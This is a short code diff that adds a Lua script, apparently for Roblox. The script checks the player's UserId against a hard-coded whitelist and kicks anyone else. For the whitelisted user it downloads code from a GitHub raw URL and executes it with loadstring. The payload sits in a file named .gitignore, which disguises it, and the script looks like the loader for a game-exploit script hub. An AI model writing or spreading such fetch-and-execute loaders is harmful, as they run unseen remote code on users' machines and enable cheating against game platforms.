@@ -1,1 +1,8 @@
-print("e")
+local pl = game.Players.LocalPlayer
+if pl.UserId == 675333450 then
+	print("Whitelisted check # 1 = true")
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Skrapisismyscript/skilledhub/main/.gitignore", true))()
+else
+	pl:KicK("Whitelist check #1 = false, try again later :(")
+end
